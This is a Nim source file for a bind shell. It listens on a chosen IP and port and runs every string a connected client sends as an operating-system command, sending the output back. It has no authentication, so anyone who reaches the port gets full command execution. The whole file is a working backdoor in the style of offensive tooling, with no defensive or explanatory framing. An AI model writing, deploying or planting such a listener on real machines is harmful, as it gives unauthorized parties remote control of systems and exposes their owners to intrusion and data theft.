import net
from os import setCurrentDir, commandLineParams, splitPath, getAppFilename
from osproc import execCmdEx
from strutils import parseUINT
from strformat import `&`

## execute a given command
## return the result (stdout)
proc exec(cmd: string): string =
  if cmd.len >= 4 and cmd[0..2] == "cd ":
    echo "changing dir here"
    let newDir = cmd[3..cmd.len-1]
    echo newDir
    try:
      setCurrentDir(newDir)
      return "changed dir with success\n"
    except:
      return &"couldn't change to {newDir}\n"
  let (output, _) = execCmdEx(cmd)
  return output

## handle a client
proc handle(client: Socket): bool =
  defer:
    client.close()
  var
    input = ""
    output = ""
  while true:
    input = recv(client, 4096)
    if input == "": return false
    if input == "exit": return false
    if input == "STOP": return true
    echo input
    output = exec(input)
    send(client, output)

when isMainModule:
  ## get and check arguments
  let argv = commandLineParams()
  if argv.len != 2:
    let bin = splitPath(getAppFilename()).tail
    echo &"usage: ./{bin} [ip] [port]"
    quit(1)

  ## init server and client variables
  let
    ip = argv[0]
    port = Port(parseUInt(argv[1]))
    server = newSocket(buffered = false)
  var
    client = newSocket(buffered = false)
    client_addr = ""

  ## start the server
  server.setSockOpt(OptReuseAddr, true)
  server.bindAddr(port, ip)
  server.listen()
  echo &"[+] Listening on {ip}:{port}"

  ## main loop accepting clients
  while true:
    server.acceptAddr(client, client_addr)
    echo &"[+] Client from {client_addr}"
    if handle(client): break
    echo &"[-] Client from {client_addr}"
  server.close()
